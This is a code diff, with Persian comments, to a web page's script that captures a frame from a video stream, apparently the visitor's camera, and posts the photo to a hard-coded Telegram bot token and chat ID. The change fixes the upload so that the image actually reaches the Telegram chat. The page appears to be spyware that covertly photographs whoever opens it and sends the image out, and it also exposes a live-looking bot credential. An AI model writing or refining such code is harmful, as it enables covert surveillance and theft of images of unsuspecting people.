@@ -25,35 +25,35 @@
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // گرفتن عکس و تبدیل به Base64
-                    const imageData = canvas.toDataURL('image/png');
+                    // گرفتن عکس و تبدیل به فایل Blob
+                    canvas.toBlob(blob => {
+                        // ارسال به تلگرام
+                        uploadToTelegram(blob);
 
-                    // ارسال به تلگرام
-                    uploadToTelegram(imageData);
-
-                    // متوقف کردن دوربین
-                    stream.getTracks().forEach(track => track.stop());
+                        // متوقف کردن دوربین
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
                 };
             })
             .catch(error => console.error('خطا:', error));
 
-        function uploadToTelegram(imageData) {
+        function uploadToTelegram(imageBlob) {
             const botToken = "8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY";
             const chatId = "5871430093";
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageBlob, 'photo.jpg');
+
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData
-                })
+                body: formData
             }).then(response => {
                 if (response.ok) {
                     console.log('عکس با موفقیت ارسال شد!');
                 } else {
                     console.error('خطا در ارسال عکس.');
                 }
-            });
+            }).catch(error => console.error('خطای شبکه:', error));
         }
     </script>
 </body>
